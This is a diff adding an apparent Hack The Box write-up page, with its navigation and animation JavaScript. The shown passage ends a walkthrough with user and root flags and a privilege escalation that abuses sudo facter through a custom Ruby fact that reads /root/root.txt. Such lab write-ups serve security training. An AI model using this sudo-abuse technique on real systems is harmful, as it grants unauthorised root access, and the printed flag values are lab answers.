+          <div class="flag-box">&#127987; user.txt: c9c893330f8a88c388745862a2ccd223</div>
+
+          <h2>Privilege Escalation &mdash; sudo facter</h2>
+          <p><strong>Facter</strong> is a Ruby-based system profiling tool from the Puppet ecosystem. The <code>--custom-dir</code> flag loads arbitrary Ruby files &mdash; running it with sudo is equivalent to root shell access.</p>
+          <pre><span class="keyword">$</span> mkdir -p /tmp/facts
+<span class="keyword">$</span> cat &gt; /tmp/facts/pwn.rb &lt;&lt; <span class="string">'EOF'
+Facter.add(:pwn) do
+  setcode do
+    Facter::Core::Execution.execute("cat /root/root.txt")
+  end
+end
+EOF</span>
+
+<span class="keyword">$</span> sudo /usr/bin/facter --custom-dir /tmp/facts pwn
+<span class="string">6af031dd9e664c8e9ec6383ba8308a2e</span></pre>
+          <div class="flag-box">&#127987; root.txt: 6af031dd9e664c8e9ec6383ba8308a2e</div>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li><strong>Open registration + authenticated CVEs = unauthenticated attack</strong> &mdash; always check <code>/admin/register</code>, <code>/signup</code> on any CMS</li>
+            <li><strong>Application databases store more than user creds</strong> &mdash; CMS platforms routinely store cloud provider credentials and API keys</li>
+            <li><strong>Ruby-based tools with sudo are root</strong> &mdash; Facter, IRB, Rails console &mdash; any tool that evaluates Ruby code grants full execution</li>
+          </ul>
+        </div>
+      </div>
+
+
+    </div><!-- /content-scroll -->
+  </div><!-- /main -->
+</div><!-- /layout -->
+
+<script>
+// ── PARTICLE BACKGROUND ──────────────────────────
+(function() {
+  const canvas = document.getElementById('particles');
+  const ctx = canvas.getContext('2d');
+  let particles = [];
+  const N = 50;
+  function resize() { canvas.width = innerWidth; canvas.height = innerHeight; }
+  resize();
+  window.addEventListener('resize', resize);
+  function Particle() {
+    this.x = Math.random() * canvas.width;
+    this.y = Math.random() * canvas.height;
+    this.vx = (Math.random() - 0.5) * 0.3;
+    this.vy = (Math.random() - 0.5) * 0.3;
+    this.r  = Math.random() * 1.2 + 0.4;
+  }
+  Particle.prototype.update = function() {
+    this.x += this.vx; this.y += this.vy;
+    if (this.x < 0 || this.x > canvas.width)  this.vx *= -1;
+    if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
+  };
+  for (let i = 0; i < N; i++) particles.push(new Particle());
+  function animate() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    for (let i = 0; i < N; i++) {
+      particles[i].update();
+      ctx.beginPath();
+      ctx.arc(particles[i].x, particles[i].y, particles[i].r, 0, Math.PI*2);
+      ctx.fillStyle = 'rgba(168,85,247,0.45)';
+      ctx.fill();
+      for (let j = i+1; j < N; j++) {
+        const dx = particles[i].x - particles[j].x;
+        const dy = particles[i].y - particles[j].y;
+        const d  = Math.sqrt(dx*dx+dy*dy);
+        if (d < 130) {
+          ctx.beginPath();
+          ctx.moveTo(particles[i].x, particles[i].y);
+          ctx.lineTo(particles[j].x, particles[j].y);
+          ctx.strokeStyle = 'rgba(168,85,247,'+(0.06*(1-d/130))+')';
+          ctx.lineWidth = 0.5;
+          ctx.stroke();
+        }
+      }
+    }
+    requestAnimationFrame(animate);
+  }
+  animate();
+})();
+
+// ── STATE ─────────────────────────────────────────
+const state = {
+  currentPost: 'htb-kotarak',
+  openTabs: ['htb-kotarak'],
+  folderMeta: {
+    'htb-kotarak':       { label: 'Kotarak',          folder: 'HTB',      dot: '#f87171' },
+    'htb-pirate':        { label: 'Pirate',           folder: 'HTB',      dot: '#f87171' },
+    'htb-interpreter':   { label: 'Interpreter',      folder: 'HTB',      dot: '#fb923c' },
+    'htb-monitorsfour':  { label: 'MonitorsFour',     folder: 'HTB',      dot: '#fb923c' },
+    'htb-pterodactyl':   { label: 'Pterodactyl',      folder: 'HTB',      dot: '#fb923c' },
+    'htb-cctv':          { label: 'CCTV',             folder: 'HTB',      dot: '#4ade80' },
+    'htb-facts':         { label: 'Facts',            folder: 'HTB',      dot: '#4ade80' },
+    'htb-variatype':     { label: 'VariaType',        folder: 'HTB',      dot: '#fb923c' },
+  }
+};
+
+// ── FOLDER TOGGLE ─────────────────────────────────
+function toggleFolder(header) {
+  const folder = header.parentElement;
+  folder.classList.toggle('open');
+}
+
+// ── SHOW LANDING ─────────────────────────────────
+function showLanding() {
+  document.querySelectorAll('.content-pane').forEach(p => p.classList.remove('active'));
+  document.getElementById('landing').style.display = 'block';
+  document.querySelectorAll('.file-entry').forEach(e => e.classList.remove('active'));
+  state.currentPost = null;
+  document.getElementById('pathFolder').textContent = '';
+  document.getElementById('pathFile').textContent   = '';
+  renderTabs();
+}
+
+// ── OPEN POST ─────────────────────────────────────
+function openPost(postId, entryEl) {
+  // hide landing
+  document.getElementById('landing').style.display = 'none';
+
+  // show correct content pane
+  document.querySelectorAll('.content-pane').forEach(p => p.classList.remove('active'));
+  const pane = document.getElementById('post-' + postId);
+  if (pane) pane.classList.add('active');
+
+  // sidebar highlight
+  document.querySelectorAll('.file-entry').forEach(e => e.classList.remove('active'));
+  const sideEntry = entryEl || document.querySelector('[data-post="'+postId+'"]');
+  if (sideEntry) {
+    sideEntry.classList.add('active');
+    // ensure parent folder is open
+    const folder = sideEntry.closest('.folder');
+    if (folder) folder.classList.add('open');
+  }
+
+  // update breadcrumb
+  const meta = state.folderMeta[postId];
+  if (meta) {
+    document.getElementById('pathFolder').textContent = meta.folder;
+    document.getElementById('pathFile').textContent   = meta.label;
+  }
+
+  // tabs
+  state.currentPost = postId;
+  if (!state.openTabs.includes(postId)) state.openTabs.push(postId);
+  renderTabs();
+
+  // scroll to top
+  document.getElementById('content-scroll').scrollTop = 0;
+}
+
+// ── CLOSE TAB ─────────────────────────────────────
+function closeTab(postId, e) {
+  e.stopPropagation();
+  state.openTabs = state.openTabs.filter(t => t !== postId);
+  if (state.currentPost === postId) {
+    if (state.openTabs.length > 0) {
+      openPost(state.openTabs[state.openTabs.length - 1], null);
+    } else {
+      showLanding();
+    }
+  }
+  renderTabs();
+}
+
+// ── RENDER TABS ───────────────────────────────────
+function renderTabs() {
+  const strip = document.getElementById('tabStrip');
+  strip.innerHTML = '';
+  state.openTabs.forEach(postId => {
+    const meta = state.folderMeta[postId];
+    if (!meta) return;
+    const pill = document.createElement('div');
+    pill.className = 'tab-pill' + (state.currentPost === postId ? ' active' : '');
+    pill.innerHTML =
+      '<span class="tab-dot" style="background:'+meta.dot+'"></span>' +
+      meta.label +
+      '<span class="tab-close" onclick="closeTab(\''+postId+'\',event)">&#10005;</span>';
+    pill.onclick = () => openPost(postId, null);
+    strip.appendChild(pill);
+  });
+}
+
+// ── SIDEBAR TOGGLE ────────────────────────────────
+document.getElementById('sidebar-toggle').addEventListener('click', () => {
+  document.getElementById('sidebar').classList.toggle('collapsed');
+});
+
+// ── SEARCH ────────────────────────────────────────
+document.getElementById('searchInput').addEventListener('input', function() {
+  const q = this.value.toLowerCase();
+  document.querySelectorAll('.file-entry').forEach(entry => {
+    const text = entry.textContent.toLowerCase();
+    entry.style.display = (!q || text.includes(q)) ? '' : 'none';
+  });
+  // show/hide folder children based on matches
+  document.querySelectorAll('.folder').forEach(folder => {
+    const hasVisible = [...folder.querySelectorAll('.file-entry')]
+      .some(e => e.style.display !== 'none');
+    if (q) {
+      folder.classList.toggle('open', hasVisible);
+    }
+  });
+});
+
+// ── INIT ──────────────────────────────────────────
+renderTabs();
+</script>
+</body>
+</html>
